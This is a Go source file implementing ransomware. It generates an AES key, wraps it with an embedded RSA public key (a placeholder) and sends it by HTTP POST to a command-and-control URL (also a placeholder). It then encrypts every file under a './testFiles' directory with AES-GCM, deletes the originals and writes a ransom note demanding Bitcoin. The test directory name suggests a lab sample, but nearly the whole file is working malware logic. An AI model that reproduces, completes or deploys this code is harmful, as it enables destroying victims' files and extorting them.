package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"bytes"
	"net/http"
	"os"
	"path/filepath"
)

// RSA Public Key
const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
AAAAA
-----END PUBLIC KEY-----`

// Generate a 32-byte AES key
func generateAESKey() ([]byte, error) {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		return nil, err
	}
	return key, nil
}

// Encrypt the AES key using RSA Public Key
func encryptAESKeyWithRSA(aesKey []byte) ([]byte, error) {
	block, _ := pem.Decode([]byte(publicKeyPEM))
	if block == nil {
		return nil, fmt.Errorf("failed to parse RSA public key")
	}
	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	rsaPubKey, ok := pubKey.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("failed to cast to RSA public key")
	}

	// Use SHA-256 as hash function for OAEP
	label := []byte("") // OAEP label (can be empty)
	hash := sha256.New()

	encryptedKey, err := rsa.EncryptOAEP(hash, rand.Reader, rsaPubKey, aesKey, label)
	if err != nil {
		return nil, err
	}
	return encryptedKey, nil
}

func sendKeyToC2(encryptedKey []byte) error {
	c2URL := "C2 Server"

	// Encode the encrypted key in Base64
	encodedKey := base64.StdEncoding.EncodeToString(encryptedKey)

	// Send via HTTP POST request
	_, err := http.Post(c2URL, "application/octet-stream", bytes.NewBufferString(encodedKey))
	return err
}
// Encrypt a file using AES-GCM
func encryptFile(path string, aesKey []byte) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	// AES cipher block
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	// Generate a nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	// Encrypt data
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	// Write encrypted data to a new file
	encPath := path + ".enc"
	err = os.WriteFile(encPath, ciphertext, 0666)
	if err != nil {
		return err
	}

	// Delete original file
	return os.Remove(path)
}

// Encrypt all files in a directory
func encryptDirectory(dir string, aesKey []byte) {
	_ = filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() {
			fmt.Println("Encrypting:", path)
			encryptFile(path, aesKey)
		}
		return nil
	})
}

// Drop ransom note
func dropRansomNote(dir string) {
	note := `YOUR FILES HAVE BEEN ENCRYPTED.
To recover them, send Bitcoin and contact us.`
	_ = os.WriteFile(filepath.Join(dir, "README_RECOVER.txt"), []byte(note), 0666)
}

// Main function
func main() {
	// Generate AES Key
	aesKey, err := generateAESKey()
	if err != nil {
		fmt.Println("Failed to generate AES key:", err)
		return
	}

	// Encrypt AES Key with RSA
	encryptedAESKey, err := encryptAESKeyWithRSA(aesKey)
	if err != nil {
		fmt.Println("Failed to encrypt AES key:", err)
		return
	}

	// Send Key to C2
	err = sendKeyToC2(encryptedAESKey)
	if err != nil {
		fmt.Println("Failed to send encrypted key to C2:", err)
	}

	// Encrypt files in directory
	encryptDirectory("./testFiles", aesKey)

	// Drop ransom note
	dropRansomNote("./testFiles")

	// Clear AES key from memory
	aesKey = nil
}
